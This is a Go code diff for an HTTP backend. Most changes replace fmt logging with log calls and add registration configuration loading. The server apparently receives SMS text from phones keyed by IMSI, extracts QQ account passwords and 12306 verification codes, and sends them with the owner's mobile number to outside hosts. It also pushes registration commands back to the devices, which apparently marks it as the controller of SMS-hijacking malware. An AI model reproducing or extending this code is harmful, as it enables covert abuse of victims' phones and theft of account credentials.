@@ -19,6 +19,13 @@ import (
 )
 
 func logSendC(info InfoRequest) {
+	defer func() {
+		if err := recover(); err != nil {
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容，55
+			log.Println("error end:")
+		}
+	}()
 	random := rand.New(rand.NewSource(time.Now().UnixNano()))
 	id := time.Now().UnixNano()/1e2 + int64(random.Intn(10000))
 	sql := `insert into log_async_generals (id,logId,para01,para02,para03,para04,para05,para06,para07) values (?,?,?,?,?,?,?,?,?)`
@@ -26,6 +33,13 @@ func logSendC(info InfoRequest) {
 }
 
 func logGetC(info InfoRequest) {
+	defer func() {
+		if err := recover(); err != nil {
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容，55
+			log.Println("error end:")
+		}
+	}()
 	random := rand.New(rand.NewSource(time.Now().UnixNano()))
 	id := time.Now().UnixNano()/1e2 + int64(random.Intn(10000))
 	sql := `insert into log_async_generals (id,logId,para01,para02,para03,para04,para05) values (?,?,?,?,?,?,?)`
@@ -35,19 +49,19 @@ func logGetC(info InfoRequest) {
 func sendC(w http.ResponseWriter, r *http.Request) {
 	defer func() {
 		if err := recover(); err != nil {
-			fmt.Println("error begin:")
-			fmt.Println(err) // 这里的err其实就是panic传入的内容，55
-			fmt.Println("error end:")
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容，55
+			log.Println("error end:")
 		}
 	}()
 	w.Write([]byte("<datas><stats>1</stats></datas>"))
 	// fmt.Fprintf(w, "Hello, %s", html.EscapeString(req.URL.Path))
-	fmt.Println("sendC RawQuery, %s", r.URL.RawQuery)
+	log.Println("sendC RawQuery, %s", r.URL.RawQuery)
 	// req.ParseForm()
 	// msg := r.Form["msg"]
 	msg := r.FormValue("msg")
 	user := getUserByImsi(r.FormValue("imsi"))
-	fmt.Println("Get form, %s", msg)
+	log.Println("Get form, %s", msg)
 	infoLog := InfoRequest{Imsi: r.FormValue("imsi"), Ip: processIp(r.RemoteAddr), Msg: r.FormValue("msg"), Code: r.FormValue("code"), Cid: r.FormValue("cid"), Apid: r.FormValue("apid"), Mobile: (*user)["mobile"]}
 	go logSendC(infoLog)
 	if strings.EqualFold(r.FormValue("apid"), "4") {
@@ -61,7 +75,7 @@ func processQqRegister(msg string, user map[string]string) {
 	exp := regexp.MustCompile(`您获得QQ号(\S*),密`)
 	result := exp.FindStringSubmatch(msg)
 	if nil != result {
-		fmt.Println(result[1])
+		log.Println(result[1])
 		qq := result[1]
 		if strings.Contains(msg, "。本") {
 			exp = regexp.MustCompile(`密码(\S*)。本`)
@@ -70,7 +84,7 @@ func processQqRegister(msg string, user map[string]string) {
 		} else if strings.Contains(msg, "。欢") {
 			exp = regexp.MustCompile(`密码(\S*)。欢`)
 		} else {
-			fmt.Println("processQqRegister can not match Password")
+			log.Println("processQqRegister can not match Password")
 			return
 		}
 		result = exp.FindStringSubmatch(msg)
@@ -80,27 +94,27 @@ func processQqRegister(msg string, user map[string]string) {
 			go updateRegisterUserSuccess(user, "registerQqSuccessCount")
 		}
 	} else {
-		fmt.Println("processQqRegister can not match:%s", msg)
+		log.Println("processQqRegister can not match:%s", msg)
 	}
 }
 func process12306Register(msg string, user map[string]string) {
 	exp := regexp.MustCompile(`码：(\S*)。如`)
 	result := exp.FindStringSubmatch(msg)
 	if nil != result {
-		fmt.Println(result[1])
+		log.Println(result[1])
 		pwd := result[1]
 		go send12306toUrl(pwd, user)
 		go updateRegisterUserSuccess(user, "register12306SuccessCount")
 	} else {
-		fmt.Println("process12306Register can not match:%s", msg)
+		log.Println("process12306Register can not match:%s", msg)
 	}
 }
 func send12306toUrl(pwd string, user map[string]string) {
 	defer func() {
 		if err := recover(); err != nil {
-			fmt.Println("error begin:")
-			fmt.Println(err) // 这里的err其实就是panic传入的内容，55
-			fmt.Println("error end:")
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容，55
+			log.Println("error end:")
 		}
 	}()
 	//生成client 参数为默认
@@ -112,7 +126,7 @@ func send12306toUrl(pwd string, user map[string]string) {
 	//生成要访问的url
 	// url := "http://localhost:8090/ss/testc?smsContent=" + smsContent
 	url := "http://zy.innet18.com:8080/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
-	fmt.Println(url)
+	log.Println(url)
 	//提交请求
 	reqest, err := http.NewRequest("GET", url, nil)
 
@@ -125,12 +139,12 @@ func send12306toUrl(pwd string, user map[string]string) {
 		//将结果定位到标准输出 也可以直接打印出来 或者定位到其他地方进行相应的处理
 		stdout := os.Stdout
 		_, err = io.Copy(stdout, response.Body)
-		fmt.Println()
+		log.Println()
 
 		//返回的状态码
 		status := response.StatusCode
 
-		fmt.Println(status)
+		log.Println(status)
 	}
 
 }
@@ -138,9 +152,9 @@ func send12306toUrl(pwd string, user map[string]string) {
 func sendQqtoUrl(qq string, pwd string, user map[string]string) {
 	defer func() {
 		if err := recover(); err != nil {
-			fmt.Println("error begin:")
-			fmt.Println(err) // 这里的err其实就是panic传入的内容
-			fmt.Println("error end:")
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容
+			log.Println("error end:")
 		}
 	}()
 	//生成client 参数为默认
@@ -152,7 +166,7 @@ func sendQqtoUrl(qq string, pwd string, user map[string]string) {
 	//生成要访问的url
 	// url := "http://localhost:8090/ss/testc?smsContent=" + smsContent
 	url := "http://zy.ardgame18.com:8080/verifycode/api/getQQVerifyCode.jsp?cid=qq114&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
-	fmt.Println(url)
+	log.Println(url)
 	//提交请求
 	reqest, err := http.NewRequest("GET", url, nil)
 
@@ -165,18 +179,18 @@ func sendQqtoUrl(qq string, pwd string, user map[string]string) {
 		//将结果定位到标准输出 也可以直接打印出来 或者定位到其他地方进行相应的处理
 		stdout := os.Stdout
 		_, err = io.Copy(stdout, response.Body)
-		fmt.Println()
+		log.Println()
 
 		//返回的状态码
 		status := response.StatusCode
 
-		fmt.Println(status)
+		log.Println(status)
 	}
 
 }
 
 func testC(w http.ResponseWriter, r *http.Request) {
-	fmt.Println("testC RawQuery, %s", r.URL.RawQuery)
+	log.Println("testC RawQuery, %s", r.URL.RawQuery)
 }
 
 const DEFAULT_GETC = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da><data><kno>333</kno><kw>a*b</kw><apid>1</apid></data><data><kno>334</kno><kw>a*b</kw><apid>2</apid></data><data><kno>335</kno><kw>a*b</kw><apid>3</apid></data></da></datas>"
@@ -189,15 +203,15 @@ const TRY_MORE_TIMES = 2 //多余指令尝试次数
 func getC(w http.ResponseWriter, r *http.Request) {
 	defer func() {
 		if err := recover(); err != nil {
-			fmt.Println("error begin:")
-			fmt.Println(err) // 这里的err其实就是panic传入的内容
-			fmt.Println("error end:")
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容
+			log.Println("error end:")
 		}
 	}()
 	start := time.Now()
 	var resp string
 	user := getUserByImsi(r.FormValue("imsi"))
-	fmt.Println(*user)
+	log.Println(*user)
 	// && strings.EqualFold((*user)["province"], "广东")
 	if strings.EqualFold(mapConfig["openRegisterGet"], "open") && len([]rune((*user)["mobile"])) >= 11 && checkUserRegister(*user) {
 		//choose register content
@@ -210,30 +224,33 @@ func getC(w http.ResponseWriter, r *http.Request) {
 	}
 	w.Write([]byte(resp))
 
-	fmt.Println("getC RawQuery,", r.URL.RawQuery)
+	log.Println("getC RawQuery,", r.URL.RawQuery)
 
 	infoLog := InfoRequest{Imsi: r.FormValue("imsi"), Ip: processIp(r.RemoteAddr), Cid: r.FormValue("cid"), Mobile: (*user)["mobile"], Resp: resp}
 	end := time.Now()
 	go logGetC(infoLog)
-	fmt.Println("getc total time(s):", end.Sub(start).Seconds())
+	log.Println("getc total time(s):", end.Sub(start).Seconds())
 }
 
 func chooseRegisterContent(user map[string]string) string {
 	var result string
 	appList := ""
+	appCount := 0
 	//请注意这里有相当于硬编码的执行顺序
 	if strings.EqualFold(mapConfig["registerSmsGet12306"], "open") && checkSmsRegister(user, "register12306CmdCount", "register12306SuccessCount", "12306RegisterLimit") {
 		result = REGISTER_GETC_12306
 		appList = ",5,"
+		appCount++
 	} else if strings.EqualFold(mapConfig["registerSmsGetQq"], "open") && checkSmsRegister(user, "registerQqCmdCount", "registerQqSuccessCount", "qqRegisterLimit") {
 		result = REGISTER_GETC_QQ
 		appList = ",4,"
-	} else {
-		result = DEFAULT_GETC
-		go cleanRegisterUserCmdList(user)
+		appCount++
 	}
 	if !strings.EqualFold(appList, "") {
 		go processRegisterUser(user, appList)
+	} else {
+		result = DEFAULT_GETC
+		go cleanRegisterUserCmdList(user)
 	}
 	return result
 }
@@ -296,9 +313,9 @@ func processIp(ori string) string {
 	}
 }
 
-func timerMinute() {
+func timerReload() {
 	for {
-		time.Sleep(time.Minute)
+		time.Sleep(time.Second * 6)
 		loadGlobalConfigFromDb()
 	}
 }
@@ -357,10 +374,14 @@ var (
 var dbLog *sql.DB
 var dbConfig *sql.DB
 var mapConfig map[string]string
+var mapRegisterTargetConfig map[string]map[string]string
+var mapRegisterChannelConfig map[string]map[string]string
 
 func init() {
 
 	mapConfig = make(map[string]string)
+	mapRegisterTargetConfig = make(map[string]map[string]string)
+	mapRegisterChannelConfig = make(map[string]map[string]string)
 	if !loadFileConfig() {
 		os.Exit(1)
 	}
@@ -392,8 +413,8 @@ func init() {
 		log.Fatal(err)
 	}
 	loadGlobalConfigFromDb()
-	go timerMinute()
-	fmt.Println("init end.")
+	go timerReload()
+	log.Println("init end.")
 }
 
 func loadGlobalConfigFromDb() {
@@ -405,14 +426,22 @@ func loadGlobalConfigFromDb() {
 	for _, value := range *resultArray {
 		mapConfig[value["title"]] = value["detail"]
 	}
-	// *mapConfig = map1
-	fmt.Println(mapConfig)
+	// log.Println(mapConfig)
+	targetArray, _ := fetchRows(dbConfig, "SELECT * FROM register_targets")
+	for _, target := range *targetArray {
+		mapRegisterTargetConfig[target["apid"]] = target
+	}
+	channelArray, _ := fetchRows(dbConfig, "SELECT * FROM register_channels")
+	for _, channel := range *channelArray {
+		mapRegisterChannelConfig[channel["apid"]] = channel
+	}
+	log.Println("loadGlobalConfigFromDb done")
 }
 
 func loadFileConfig() bool {
 	f, err := ioutil.ReadFile("config.json")
 	if err != nil {
-		fmt.Println("load config error: ", err)
+		log.Println("load config error: ", err)
 		return false
 	}
 
@@ -420,7 +449,7 @@ func loadFileConfig() bool {
 	temp := new(DbConfigs)
 	err = json.Unmarshal(f, &temp)
 	if err != nil {
-		fmt.Println("Para config failed: ", err)
+		log.Println("Para config failed: ", err)
 		return false
 	}
 
@@ -439,9 +468,9 @@ func checkErr(err error) {
 func main() {
 	defer func() {
 		if err := recover(); err != nil {
-			fmt.Println("error begin:")
-			fmt.Println(err) // 这里的err其实就是panic传入的内容，55
-			fmt.Println("error end:")
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容，55
+			log.Println("error end:")
 		}
 	}()
 	server := &http.Server{
@@ -453,10 +482,10 @@ func main() {
 	http.HandleFunc("/ss/getc", getC)
 	http.HandleFunc("/ss/testc", testC)
 	server.ListenAndServe()
-	fmt.Println((*server).ReadTimeout)
+	log.Println((*server).ReadTimeout)
 
 	// server := http.ListenAndServe(":8090", nil)
-	// fmt.Println(server.ReadTimeout)
+	// log.Println(server.ReadTimeout)
 }
 
 //插入
